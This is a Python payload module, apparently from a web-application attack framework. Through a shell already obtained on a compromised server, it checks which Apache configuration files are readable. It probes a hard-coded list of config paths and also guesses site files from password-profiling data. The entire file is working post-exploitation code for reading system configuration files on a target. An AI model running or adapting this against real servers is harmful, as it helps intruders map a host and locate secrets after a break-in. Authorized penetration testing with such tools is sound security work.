import re
import core.data.kb.knowledgeBase as kb
from plugins.attack.payloads.base_payload import base_payload

class apache_config_files(base_payload):
    '''
    This payload finds readable Apache configuration files
    '''
    def run_read(self):
        result = []
        files = []

        files.append('apache2.conf')
        files.append('httpd.conf')
        files.append('magic')
        files.append('envvars')
        files.append('ports.conf')
        files.append('conf.d/security')
        files.append('sites-available/default')
        files.append('sites-available/default-ssl')
        files.append('conf.d/subversion.conf')

        apache_dir = self.exec_payload('apache_config_directory')
        if apache_dir:
            for dir in apache_dir:
                for file in files:
                    if self.shell.read(dir+file) != '':
                        result.append(dir+file)
                        #result.append(get_files(self.shell.read(dir+file)))
                if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                    for profile in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                        result.append(dir+'sites-available/'+profile.lower())


        result = list(set(result))
        result = [p for p in result if p != '']
        if result == [ ]:
            result.append('Apache configuration files not found.')
        return result

